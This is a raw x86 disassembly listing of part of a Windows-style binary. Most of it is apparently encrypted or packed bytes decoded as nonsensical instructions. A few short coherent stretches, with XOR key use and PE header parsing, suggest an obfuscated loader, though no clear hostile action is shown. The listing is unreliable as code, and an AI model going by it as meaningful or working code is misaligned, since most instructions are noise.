  40bdcd:	cmp    BYTE PTR [eax],cl
  40bdcf:	push   esp
  40bdd0:	and    ecx,DWORD PTR [edx-0x28]
  40bdd3:	cmp    BYTE PTR [ebx+0x12],ch
  40bdd6:	es mov cl,0x26
  40bdd9:	sub    al,0x19
  40bddb:	cwde   
  40bddc:	inc    edx
  40bddd:	inc    eax
  40bdde:	aas    
  40bddf:	mov    bh,BYTE PTR [ebp+esi*4-0x52]
  40bde3:	popa   
  40bde4:	xchg   edi,eax
  40bde5:	imul   edx,DWORD PTR [esi+0x6e34a290],0xcdf072c8
  40bdef:	jmp    0x76e1b687
  40bdf4:	inc    esi
  40bdf5:	scas   eax,DWORD PTR es:[edi]
  40bdf6:	dec    esi
  40bdf7:	fwait
  40bdf8:	cmp    ebp,ebx
  40bdfa:	scas   al,BYTE PTR es:[edi]
  40bdfb:	mov    eax,0x7ffa6bd0
  40be01:	pop    esi
  40be02:	fisubr WORD PTR [edx]
  40be04:	mov    ebx,0xb12a0ef5
  40be09:	fs xchg edx,eax
  40be0b:	mov    gs,WORD PTR [eax+ebx*8]
  40be0e:	jb     0x40be8d
  40be10:	jl     0x40be77
  40be12:	int3   
  40be13:	(bad)  [edx+0x29]
  40be16:	pop    eax
  40be17:	imul   esp,DWORD PTR [ecx],0x4d
  40be1a:	jle    0x40bdd1
  40be1c:	or     eax,0xa8179b7b
  40be21:	pop    ebx
  40be22:	pop    esp
  40be23:	retf   
  40be24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be25:	icebp  
  40be26:	sti    
  40be27:	inc    esi
  40be28:	jne    0x40be05
  40be2a:	sbb    ebx,ebp
  40be2c:	lock fnstenv [edx]
  40be2f:	mul    DWORD PTR [edx-0x52]
  40be32:	pushf  
  40be33:	or     esi,ebx
  40be35:	inc    edx
  40be36:	iret   
  40be37:	mov    eax,0xbade3502
  40be3c:	jo     0x40be44
  40be3e:	inc    ebx
  40be3f:	inc    edi
  40be40:	sbb    ebp,DWORD PTR [ecx+0x44b0e016]
  40be46:	mov    esi,0x439ba2f9
  40be4b:	sbb    al,0xf0
  40be4d:	sbb    ch,BYTE PTR [ebx]
  40be4f:	mov    edx,DWORD PTR [ebp+0x14]
  40be52:	in     al,dx
  40be53:	mov    ah,0x94
  40be55:	mov    eax,0x16987605
  40be5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be5b:	adc    BYTE PTR [esp+edi*2],dh
  40be5e:	sbb    DWORD PTR [ebx+ebx*1],ebx
  40be61:	xor    BYTE PTR [ecx-0x591fb583],ah
  40be67:	test   eax,0x9bb9540f
  40be6c:	outs   dx,DWORD PTR ds:[esi]
  40be6d:	sub    eax,0xa4291a84
  40be72:	or     eax,0x1187dc54
  40be77:	or     esi,DWORD PTR [eax]
  40be79:	xchg   edi,eax
  40be7a:	add    eax,0x7b41ee0f
  40be7f:	nop
  40be80:	icebp  
  40be81:	xor    edx,DWORD PTR [edx+edi*1]
  40be84:	mov    esp,edi
  40be86:	les    ebx,FWORD PTR ds:0x32b7840c
  40be8c:	sub    DWORD PTR [esi+0x3f],ebx
  40be8f:	cwde   
  40be90:	out    0x16,eax
  40be92:	js     0x40bed1
  40be94:	mov    dh,0xac
  40be96:	daa    
  40be97:	push   ecx
  40be98:	test   DWORD PTR [ecx],ecx
  40be9a:	mov    al,0xae
  40be9c:	jle    0x40bf13
  40be9e:	call   0xb7a9:0x16a937db
  40bea5:	xchg   esi,eax
  40bea6:	in     al,dx
  40bea7:	jo     0x40be36
  40bea9:	jl     0x40bf19
  40beab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beac:	push   ds
  40bead:	sbb    eax,DWORD PTR [ecx-0x68288139]
  40beb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb4:	xchg   esp,eax
  40beb5:	sbb    esi,DWORD PTR [edi]
  40beb7:	dec    esi
  40beb8:	xor    al,0xfb
  40beba:	cmp    ebx,ebx
  40bebc:	das    
  40bebd:	add    esi,ebp
  40bebf:	pop    eax
  40bec0:	and    BYTE PTR [esi],al
  40bec2:	ffree  st(2)
  40bec4:	std    
  40bec5:	popa   
  40bec6:	les    esi,FWORD PTR [eax-0x386607d5]
  40becc:	mov    edx,0x22b0a911
  40bed1:	xor    eax,0xc3ea9bc8
  40bed6:	rcl    DWORD PTR [ebp-0x76],0x7b
  40beda:	mov    al,ds:0x3228fd47
  40bedf:	or     bh,dh
  40bee1:	pop    edx
  40bee2:	(bad)  
  40bee3:	xchg   esp,eax
  40bee4:	data16 or al,ah
  40bee7:	ins    BYTE PTR es:[edi],dx
  40bee8:	mov    ds:0x3606df9d,eax
  40beed:	leave  
  40beee:	push   eax
  40beef:	dec    esp
  40bef0:	test   eax,0x66e05135
  40bef5:	lods   eax,DWORD PTR ds:[esi]
  40bef6:	dec    ebx
  40bef7:	mov    DWORD PTR [edi-0x22df5e62],ecx
  40befd:	sbb    eax,0x88f82a2e
  40bf02:	inc    esp
  40bf03:	jb     0x40bf26
  40bf05:	cwde   
  40bf06:	inc    esp
  40bf07:	xor    edi,DWORD PTR [esi+0x6a]
  40bf0a:	fdivr  DWORD PTR [ecx]
  40bf0c:	retf   
  40bf0d:	xchg   BYTE PTR [edx-0x61],cl
  40bf10:	es mov edi,0x2f577e24
  40bf16:	shr    DWORD PTR [edi+ebx*4+0x7c],cl
  40bf1a:	sub    edx,edi
  40bf1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf1d:	pop    esp
  40bf1e:	push   0x4851119a
  40bf23:	xor    dl,dh
  40bf25:	repnz lods eax,DWORD PTR ds:[esi]
  40bf27:	cmp    DWORD PTR [ebx+0x5a],edi
  40bf2a:	cmp    BYTE PTR [esi],al
  40bf2c:	bound  edx,QWORD PTR [esi-0x6c]
  40bf2f:	lods   al,BYTE PTR ds:[esi]
  40bf30:	sti    
  40bf31:	dec    edi
  40bf32:	sbb    ebp,DWORD PTR [ebx]
  40bf34:	scas   al,BYTE PTR es:[edi]
  40bf35:	inc    ebp
  40bf36:	xchg   ebx,eax
  40bf37:	(bad)  
  40bf38:	push   ebx
  40bf39:	inc    eax
  40bf3a:	(bad)  
  40bf3b:	lods   al,BYTE PTR ds:[esi]
  40bf3c:	std    
  40bf3d:	xchg   esp,eax
  40bf3e:	shl    DWORD PTR [edx+0x3e],1
  40bf41:	sbb    ebx,DWORD PTR [edx]
  40bf43:	in     al,0xc9
  40bf45:	mov    eax,0xf63f36a4
  40bf4a:	or     esi,DWORD PTR [esi+0x1d]
  40bf4d:	mov    al,0x6f
  40bf4f:	popf   
  40bf50:	mov    edi,0x5efd082b
  40bf55:	test   dl,ch
  40bf57:	xor    al,0xb1
  40bf59:	lods   eax,DWORD PTR ds:[esi]
  40bf5a:	xor    BYTE PTR ds:0xa53fb5e8,bl
  40bf60:	in     al,0x69
  40bf62:	sti    
  40bf63:	rol    ebp,1
  40bf65:	xchg   dh,ah
  40bf67:	call   0x66dd71d5
  40bf6c:	xchg   DWORD PTR [eax-0x5b],esp
  40bf6f:	repnz icebp 
  40bf71:	ss sbb cl,bl
  40bf74:	inc    eax
  40bf75:	inc    eax
  40bf76:	call   0x9313d271
  40bf7b:	mov    DWORD PTR [ecx+ecx*8+0x27],edx
  40bf7f:	xor    esi,DWORD PTR [ebp-0x46f9c3d0]
  40bf85:	xor    DWORD PTR [esi+0x7b],ebp
  40bf88:	push   ebp
  40bf89:	add    DWORD PTR [ebx],edi
  40bf8b:	jae    0x40bfe9
  40bf8d:	push   esi
  40bf8e:	adc    eax,0x5e19fbb0
  40bf93:	add    ebp,ebp
  40bf95:	out    0x31,eax
  40bf97:	fcomi  st,st(6)
  40bf99:	fsubp  st(2),st
  40bf9b:	or     al,0x6c
  40bf9d:	sar    BYTE PTR [esi+ecx*8+0x30],cl
  40bfa1:	jno    0x40c008
  40bfa3:	xor    eax,0x4ae7fd6a
  40bfa8:	shr    BYTE PTR [edi],0x52
  40bfab:	cli    
  40bfac:	(bad)  
  40bfae:	adc    ecx,ebx
  40bfb0:	sub    al,0xb8
  40bfb2:	adc    eax,0x917096a
  40bfb7:	sub    eax,0x2ba75ba7
  40bfbc:	scas   al,BYTE PTR es:[edi]
  40bfbd:	nop
  40bfbe:	inc    di
  40bfc0:	xchg   esp,eax
  40bfc1:	pusha  
  40bfc2:	adc    al,0x2
  40bfc4:	call   0x82fc:0xf6aadeab
  40bfcb:	fcmovu st,st(7)
  40bfcd:	mov    dl,0xe9
  40bfcf:	sub    eax,DWORD PTR [ecx+0x64b4c464]
  40bfd5:	mov    dl,0x91
  40bfd7:	pop    ebx
  40bfd8:	arpl   WORD PTR [esi-0x32],dx
  40bfdb:	and    esp,DWORD PTR [esi+0x75]
  40bfde:	pop    si
  40bfe0:	pop    es
  40bfe1:	inc    ebx
  40bfe2:	add    edx,edi
  40bfe4:	(bad)  
  40bfe5:	fcmovb st,st(4)
  40bfe7:	or     DWORD PTR [esi-0x3d910ee2],0x5c
  40bfee:	cli    
  40bfef:	mov    bl,0x30
  40bff1:	fstp   QWORD PTR [esi]
  40bff3:	shl    DWORD PTR [edx-0x13ec905],1
  40bff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bffa:	enter  0x7eb4,0x4b
  40bffe:	mov    BYTE PTR [edi-0x2b7a3cb6],bl
  40c004:	(bad)  
  40c005:	pop    ds
  40c006:	or     BYTE PTR [ecx],bl
  40c008:	std    
  40c009:	xchg   edi,eax
  40c00a:	mov    edx,0x55c4cfef
  40c00f:	jl     0x40c08b
  40c011:	cld    
  40c012:	sahf   
  40c013:	fnstenv [ebp+0x59]
  40c016:	or     DWORD PTR [eax],ebx
  40c018:	(bad)  
  40c019:	(bad)  
  40c01a:	fs out dx,eax
  40c01c:	jp     0x40c031
  40c01e:	jg     0x40c08c
  40c020:	pop    ss
  40c021:	rol    bh,1
  40c023:	cmp    eax,0xa3d551ac
  40c028:	add    ah,dl
  40c02a:	in     eax,0x8d
  40c02c:	imul   edi,DWORD PTR ds:[esi+0x1a],0xffffffbb
  40c031:	jl     0x40bfdf
  40c033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c034:	fcom   DWORD PTR [eax-0x7f]
  40c037:	mov    al,0x7c
  40c039:	cli    
  40c03a:	inc    eax
  40c03b:	add    DWORD PTR [ebp+0x30],edx
  40c03e:	adc    esi,edi
  40c040:	aad    0xae
  40c042:	jb     0x40c022
  40c044:	cs je  0x40c089
  40c047:	fs nop
  40c049:	sub    eax,0xca051fbd
  40c04e:	add    DWORD PTR [esi],edi
  40c050:	sbb    ch,BYTE PTR ds:0x8ca5e3b
  40c056:	(bad)  
  40c057:	rol    BYTE PTR [edi-0x2a312a33],0xa3
  40c05e:	dec    edx
  40c05f:	cli    
  40c060:	mov    esi,0x5e03c91c
  40c065:	inc    edi
  40c066:	lods   al,BYTE PTR ds:[esi]
  40c067:	mov    eax,0xde263dea
  40c06c:	out    dx,al
  40c06d:	scas   eax,DWORD PTR es:[edi]
  40c06e:	repnz inc eax
  40c070:	sbb    al,0x9f
  40c072:	mul    DWORD PTR [edi+0x4dc4d1ad]
  40c078:	cmp    edx,eax
  40c07a:	int3   
  40c07b:	scas   al,BYTE PTR es:[edi]
  40c07c:	mov    al,0x7a
  40c07e:	jno    0x40c04e
  40c080:	sub    DWORD PTR [edi-0x2f],eax
  40c083:	sar    DWORD PTR [ecx-0x7c],1
  40c086:	out    dx,eax
  40c087:	cmp    eax,0xbdc7edaa
  40c08c:	data16 ins BYTE PTR es:[edi],dx
  40c08e:	mov    cl,0x2d
  40c090:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40c092:	loop   0x40c023
  40c094:	mov    bl,BYTE PTR ds:0x28c447ff
  40c09a:	mov    eax,0x2bfa215f
  40c09f:	loopne 0x40c107
  40c0a1:	mov    ah,BYTE PTR [ebp-0x3b]
  40c0a4:	mov    bh,0xac
  40c0a6:	add    eax,0xec31978
  40c0ab:	leave  
  40c0ac:	lods   al,BYTE PTR ds:[esi]
  40c0ad:	ret    0x885a
  40c0b0:	jae    0x40c086
  40c0b2:	test   DWORD PTR [edx+0x6ca312c3],ecx
  40c0b8:	cs leave 
  40c0ba:	jbe    0x40c0d7
  40c0bc:	pop    edi
  40c0bd:	add    esi,DWORD PTR [ebp-0x3dea14e1]
  40c0c3:	push   es
  40c0c4:	fidiv  DWORD PTR [edi]
  40c0c6:	mov    al,ds:0x8b66c82b
  40c0cb:	inc    ebp
  40c0cc:	cld    
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	lods   al,BYTE PTR ds:[esi]
  40c104:	pop    edx
  40c105:	mov    ss,ebx
  40c107:	imul   edi,ebx,0x7d2e7e7e
  40c10d:	jle    0x40c18d
  40c10f:	push   ds
  40c110:	pop    ebp
  40c111:	mov    esi,0xb660c4cd
  40c116:	out    dx,al
  40c117:	xchg   ebp,eax
  40c118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c119:	inc    eax
  40c11a:	push   edx
  40c11b:	in     al,dx
  40c11c:	jb     0x40c154
  40c11e:	xor    DWORD PTR [ecx-0x71],esp
  40c121:	ja     0x40c160
  40c123:	jle    0x40c148
  40c125:	std    
  40c126:	icebp  
  40c127:	test   bh,0x87
  40c12a:	pop    eax
  40c12b:	cmp    al,0xf
  40c12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c12e:	push   es
  40c12f:	inc    edi
  40c130:	pusha  
  40c131:	mov    dl,0x7a
  40c133:	dec    esi
  40c134:	repz inc edx
  40c136:	cld    
  40c137:	pop    ss
  40c138:	or     edi,DWORD PTR [ebx+0x198b24ce]
  40c13e:	inc    edi
  40c13f:	jle    0x40c0d6
  40c141:	in     eax,dx
  40c142:	inc    edi
  40c143:	(bad)  
  40c145:	sbb    ecx,DWORD PTR [eax+0x76]
  40c148:	jl     0x40c158
  40c14a:	in     eax,0xe0
  40c14c:	pop    ebp
  40c14d:	pop    ss
  40c14e:	cmp    al,dl
  40c150:	jmp    0x40c0fc
  40c152:	fmul   QWORD PTR [edi+0x7f8c1977]
  40c158:	sbb    BYTE PTR [esi-0x53],dl
  40c15b:	pusha  
  40c15c:	and    BYTE PTR [ecx+0x1be4871d],bl
  40c162:	lds    ebp,FWORD PTR [ecx]
  40c164:	xchg   BYTE PTR [eax-0x5b],dh
  40c167:	cdq    
  40c168:	push   ebx
  40c169:	ret    
  40c16a:	sub    eax,DWORD PTR [esi+0x294193ab]
  40c170:	loop   0x40c12e
  40c172:	in     al,dx
  40c173:	push   ecx
  40c174:	sbb    ebx,DWORD PTR ds:0x63a938eb
  40c17a:	jne    0x40c165
  40c17c:	into   
  40c17d:	sub    ah,BYTE PTR [ebp+0x6a742d78]
  40c183:	inc    edi
  40c184:	mov    al,0x76
  40c186:	mov    ebx,0x2f7b0379
  40c18b:	nop
  40c18c:	push   0xbadf7eab
  40c191:	repnz sbb DWORD PTR [ecx+0x62],edi
  40c195:	jge    0x40c120
  40c197:	xchg   esp,eax
  40c198:	mov    bl,0xbf
  40c19a:	jbe    0x40c1a5
  40c19c:	call   0x67f40a40
  40c1a1:	xchg   ecx,eax
  40c1a2:	jmp    DWORD PTR [ebp+ebp*1+0x50]
  40c1a6:	jmp    0x286a7f91
  40c1ab:	rcr    BYTE PTR [ebx+0x37b6f7c6],cl
  40c1b1:	push   edi
  40c1b2:	ins    BYTE PTR es:[edi],dx
  40c1b3:	mov    ds:0xaeb47541,eax
  40c1b8:	xchg   BYTE PTR [edx+0x2b],al
  40c1bb:	jp     0x40c1e3
  40c1bd:	push   esi
  40c1be:	push   ebp
  40c1bf:	jl     0x40c1e5
  40c1c1:	into   
  40c1c2:	test   eax,0x2e0d6c08
  40c1c7:	cwde   
  40c1c8:	push   esp
  40c1c9:	sbb    eax,0x3be52f8d
  40c1ce:	call   0xcfb6:0x73f384a3
  40c1d5:	adc    al,0x53
  40c1d7:	lods   eax,DWORD PTR ds:[esi]
  40c1d8:	test   BYTE PTR [edi],bl
  40c1da:	push   esi
  40c1db:	sub    esp,DWORD PTR [edi-0x789ba9c3]
  40c1e1:	loope  0x40c21a
  40c1e3:	lods   eax,DWORD PTR ds:[esi]
  40c1e4:	out    0x24,al
  40c1e6:	push   0x732a09c8
  40c1eb:	in     al,dx
  40c1ec:	sbb    BYTE PTR [esi+eax*8],ah
  40c1ef:	gs dec ecx
  40c1f1:	into   
  40c1f2:	cdq    
  40c1f3:	xor    eax,0xb766c348
  40c1f8:	sbb    al,0x91
  40c1fa:	into   
  40c1fb:	test   al,0x41
  40c1fd:	push   ss
  40c1fe:	add    eax,0x26e5c506
  40c203:	add    eax,0x6b9e3e2c
  40c208:	fcom   DWORD PTR cs:[ebp-0x57]
  40c20c:	popa   
  40c20d:	pop    ebp
  40c20e:	and    BYTE PTR [ecx-0x480c88b3],0x66
  40c215:	mov    bh,0x6a
  40c217:	inc    edx
  40c218:	gs aad 0xbc
  40c21b:	push   ss
  40c21c:	(bad)  
  40c21d:	sub    al,0xb1
  40c21f:	fnstcw WORD PTR [edx]
  40c221:	(bad)  
  40c223:	mov    ecx,0xbaa116d4
  40c228:	inc    eax
  40c229:	dec    DWORD PTR [eax]
  40c22b:	test   bl,ah
  40c22d:	cmp    BYTE PTR [edx+0x4c],bl
  40c230:	sub    eax,0x96b69587
  40c235:	(bad)  
  40c236:	outs   dx,BYTE PTR ds:[esi]
  40c237:	hlt    
  40c238:	scas   eax,DWORD PTR es:[edi]
  40c239:	shl    ebp,0xf4
  40c23c:	das    
  40c23d:	scas   al,BYTE PTR es:[edi]
  40c23e:	mov    ah,0x35
  40c240:	jmp    0x40c286
  40c242:	in     al,0xa0
  40c244:	and    ebp,edx
  40c246:	jb     0x40c21a
  40c248:	mov    edx,0xe356e5f2
  40c24d:	sbb    dl,ah
  40c24f:	mov    dh,0x69
  40c251:	add    BYTE PTR [ebp+esi*1-0x65],al
  40c255:	sub    al,0xcc
  40c257:	mov    esp,0xe88e0d74
  40c25c:	dec    ecx
  40c25d:	jae    0x40c2a3
  40c25f:	(bad)  
  40c260:	aas    
  40c261:	sub    DWORD PTR [esi-0x4a673c78],esi
  40c267:	enter  0x8361,0x25
  40c26b:	jae    0x40c26b
  40c26d:	ins    DWORD PTR es:[edi],dx
  40c26e:	(bad)  
  40c26f:	outs   dx,BYTE PTR ds:[esi]
  40c270:	xor    bl,BYTE PTR [ecx+eiz*2]
  40c273:	xchg   BYTE PTR [esp+ebp*2-0x15],al
  40c277:	sub    al,0xcd
  40c279:	loope  0x40c2a5
  40c27b:	xlat   BYTE PTR ds:[ebx]
  40c27c:	inc    edi
  40c27d:	mov    ds:0x830bbfbd,eax
  40c282:	stos   BYTE PTR es:[edi],al
  40c283:	mov    ecx,0x389d968e
  40c288:	outs   dx,BYTE PTR ds:[esi]
  40c289:	mov    eax,0xa591f351
  40c28e:	adc    edi,DWORD PTR [ebx+edx*4+0x27]
  40c292:	mov    gs,esi
  40c294:	add    ebp,ebx
  40c296:	pop    eax
  40c297:	inc    edi
  40c298:	jmp    0xaec1:0xc6f4fbad
  40c29f:	ret    
  40c2a0:	div    DWORD PTR [edx+0x11e05934]
  40c2a6:	sub    ch,cl
  40c2a8:	int    0xb2
  40c2aa:	lods   al,BYTE PTR ds:[esi]
  40c2ab:	iret   
  40c2ac:	rol    BYTE PTR [ebp+0x30],0x2
  40c2b0:	gs add eax,0x1b4a996d
  40c2b6:	mov    bl,0xf6
  40c2b8:	mul    BYTE PTR [eax+0x74]
  40c2bb:	cmp    al,0x65
  40c2bd:	(bad)  
  40c2be:	in     al,dx
  40c2bf:	push   eax
  40c2c0:	retf   0xc5bb
  40c2c3:	add    al,0x4d
  40c2c5:	xchg   esp,eax
  40c2c6:	loope  0x40c2e4
  40c2c8:	loope  0x40c255
  40c2ca:	mov    esi,0x1cd561a1
  40c2cf:	outs   dx,DWORD PTR ds:[esi]
  40c2d0:	cdq    
  40c2d1:	jno    0x40c280
  40c2d3:	add    esi,DWORD PTR [ebp+0x38defe29]
  40c2d9:	mov    bl,0x76
  40c2db:	fist   DWORD PTR [eax-0x61]
  40c2de:	jno    0x40c2f4
  40c2e0:	push   edx
  40c2e1:	push   es
  40c2e2:	pop    ebp
  40c2e3:	ds clc 
  40c2e5:	push   edi
  40c2e6:	xchg   DWORD PTR [edi],esp
  40c2e8:	sub    al,0x70
  40c2ea:	in     eax,0x76
  40c2ec:	and    DWORD PTR [ebp-0x1bb56810],esp
  40c2f2:	and    ah,ah
  40c2f4:	xsaves [ebp-0x7989d3a9]
  40c2fb:	cmc    
  40c2fc:	dec    ebx
  40c2fd:	sbb    eax,0x2169a1e4
  40c302:	arpl   WORD PTR [ebp+0x2ca8f4f0],si
  40c308:	leave  
  40c309:	xchg   edi,eax
  40c30a:	in     eax,0xa1
  40c30c:	sbb    al,BYTE PTR [ecx]
  40c30e:	fdiv   QWORD PTR [ebp+edi*1+0x72f9d4c4]
  40c315:	cld    
  40c316:	sbb    BYTE PTR [ebp*4-0x51907d7e],ch
  40c31d:	mov    bl,BYTE PTR [ebp+0x3b]
  40c320:	imul   ebx,DWORD PTR [edx],0x256794ac
  40c326:	int    0xf2
  40c328:	adc    eax,0xad0a5c81
  40c32d:	inc    ebx
  40c32e:	sar    edx,0x4b
  40c331:	retf   0xaf99
  40c334:	and    ch,BYTE PTR es:[ebx]
  40c337:	mov    bl,0x8
  40c339:	pop    ds
  40c33a:	and    eax,0x7ff42c46
  40c33f:	add    BYTE PTR [esi],ch
  40c341:	pop    edi
  40c342:	hlt    
  40c343:	scas   al,BYTE PTR es:[edi]
  40c344:	inc    ecx
  40c345:	retf   0xd1ca
  40c348:	lahf   
  40c349:	pop    ebx
  40c34a:	xchg   edi,eax
  40c34c:	mov    ds:0xefa402b6,eax
  40c351:	xchg   edx,eax
  40c352:	lods   eax,DWORD PTR ds:[esi]
  40c353:	mov    eax,0x1865dee0
  40c358:	fiadd  WORD PTR [ebx]
  40c35a:	or     ch,BYTE PTR [eax-0x141d8758]
  40c360:	retf   
  40c361:	lods   eax,DWORD PTR ds:[esi]
  40c362:	call   DWORD PTR [edi]
  40c364:	jne    0x40c32c
  40c366:	scas   eax,DWORD PTR es:[edi]
  40c367:	scas   al,BYTE PTR es:[edi]
  40c368:	lahf   
  40c369:	out    0x15,eax
  40c36b:	js     0x40c329
  40c36d:	int3   
  40c36e:	pop    ebx
  40c36f:	or     esi,DWORD PTR [ebx+0x1defebe0]
  40c375:	inc    esp
  40c376:	sahf   
  40c377:	mov    ah,0xa8
  40c379:	or     DWORD PTR [eax],0xb39ce6ed
  40c37f:	inc    ebx
  40c380:	inc    ebp
  40c381:	in     al,0x99
  40c383:	pop    edx
  40c384:	or     BYTE PTR [esi],0xae
  40c387:	xchg   esi,eax
  40c388:	sub    DWORD PTR [edi+0x216f7b0],ebp
  40c38e:	dec    ebp
  40c38f:	mov    bh,bh
  40c391:	mov    bl,0xdd
  40c393:	bound  eax,QWORD PTR [esp+ebp*4]
  40c396:	adc    edx,DWORD PTR [edx+0x4b]
  40c399:	ret    0xd289
  40c39c:	jecxz  0x40c321
  40c39e:	pop    ebp
  40c39f:	int3   
  40c3a0:	pop    es
  40c3a1:	out    dx,eax
  40c3a2:	mov    ch,0xe7
  40c3a4:	inc    edi
  40c3a5:	pop    ecx
  40c3a6:	jbe    0x40c328
  40c3a8:	xchg   edx,eax
  40c3a9:	mov    bh,0x15
  40c3ab:	in     al,dx
  40c3ac:	sub    edi,DWORD PTR [ecx]
  40c3ae:	pop    ebp
  40c3af:	pop    ecx
  40c3b0:	lea    ecx,[esi-0x14277722]
  40c3b6:	pop    edx
  40c3b7:	(bad)  
  40c3b8:	jg     0x40c379
  40c3ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3bb:	or     ch,BYTE PTR [ecx]
  40c3bd:	mov    DWORD PTR [esi+0x1379907a],esp
  40c3c3:	pusha  
  40c3c4:	test   al,0xdb
  40c3c6:	jmp    0x40c3a0
  40c3c8:	ds cmp eax,0xe9700d3a
  40c3ce:	mov    eax,ds:0x2e76494d
  40c3d3:	add    BYTE PTR [edi+0x72e6e12c],ah
  40c3d9:	adc    al,0x19
  40c3db:	mov    ah,0x68
  40c3dd:	retf   
  40c3de:	and    eax,0x39c3fac3
  40c3e3:	xchg   DWORD PTR [ecx+0xb6b8b09],edi
  40c3e9:	sub    DWORD PTR [esp+ebp*8+0x42],esp
  40c3ed:	push   ecx
  40c3ee:	cs mov esp,0x26b60152
  40c3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3f5:	sbb    eax,0x32e2f775
  40c3fa:	add    al,0x7f
  40c3fc:	mov    dh,0xfd
  40c3fe:	jnp    0x40c3f2
  40c400:	cld    
  40c401:	cld    
  40c402:	mov    dh,0x70
  40c404:	lds    edi,FWORD PTR [eax]
  40c406:	sbb    BYTE PTR ss:[edx-0x7b],dl
  40c40a:	cmp    al,BYTE PTR [ecx]
  40c40c:	popf   
  40c40d:	sub    dh,BYTE PTR ds:0x9c7a75f4
  40c413:	xlat   BYTE PTR ds:[ebx]
  40c414:	out    dx,eax
  40c415:	push   eax
  40c416:	jno    0x40c42b
  40c418:	xchg   esp,eax
  40c419:	ins    BYTE PTR es:[edi],dx
  40c41a:	or     esi,DWORD PTR [edx+eax*2]
  40c41d:	fs pop ds
  40c41f:	xor    BYTE PTR [edi],bl
  40c421:	fs dec edi
  40c423:	push   0x7f
  40c425:	ja     0x40c3df
  40c427:	and    al,0xd8
  40c429:	cmc    
  40c42a:	nop
  40c42b:	sub    ebp,DWORD PTR [esi-0x7d]
  40c42e:	pop    ecx
  40c42f:	jae    0x40c3b8
  40c431:	call   0xe364:0x388e6cff
  40c438:	or     ah,BYTE PTR [ebx+0x4bb93f9b]
  40c43e:	adc    eax,0x9b08848d
  40c443:	jb     0x40c477
  40c445:	add    BYTE PTR [esi-0x77],ah
  40c448:	inc    ebp
  40c449:	cld    
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x17]
  40c49b:	cli    
  40c49c:	(bad)  
  40c49d:	jbe    0x40c4b8
  40c49f:	xchg   DWORD PTR [esi+0x7e],edi
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c469
  40c4a7:	adc    ebp,DWORD PTR [ebx+0x31]
  40c4aa:	push   es
  40c4ab:	je     0x40c44c
  40c4ad:	lahf   
  40c4ae:	fidiv  WORD PTR [ebp-0x80]
  40c4b1:	inc    ecx
  40c4b2:	into   
  40c4b3:	jne    0x40c43b
  40c4b5:	inc    ebx
  40c4b6:	lahf   
  40c4b7:	es loopne 0x40c47a
  40c4ba:	fsub   st(3),st
  40c4bc:	mul    DWORD PTR [edi+0x4a573bc1]
  40c4c2:	pop    eax
  40c4c3:	ds xchg ebp,eax
  40c4c5:	shl    DWORD PTR [esp+edx*4+0xe],cl
  40c4c9:	addr16 addr16 cli 
  40c4cc:	(bad)  
  40c4cd:	add    dh,BYTE PTR es:[edx-0x14b2de47]
  40c4d4:	lods   eax,DWORD PTR ds:[esi]
  40c4d5:	jmp    0xa91d:0x34ffd3e8
  40c4dc:	xchg   esi,eax
  40c4dd:	sahf   
  40c4de:	mov    ch,0x72
  40c4e0:	mov    BYTE PTR [eax+ebx*8+0x60],al
  40c4e4:	(bad)  
  40c4e5:	nop
  40c4e6:	test   BYTE PTR [ebx+0x6b200cd5],ch
  40c4ec:	clc    
  40c4ed:	inc    eax
  40c4ee:	(bad)  
  40c4ef:	ja     0x40c4e9
  40c4f1:	loopne 0x40c53a
  40c4f3:	mov    al,0x8c
  40c4f5:	or     ebx,DWORD PTR [edx-0x51]
  40c4f8:	pop    ss
  40c4f9:	into   
  40c4fa:	add    dl,BYTE PTR [ecx+0x5e90af48]
  40c500:	cmp    BYTE PTR [edx+0x29],dh
  40c503:	shl    DWORD PTR [edi-0x637cbe03],cl
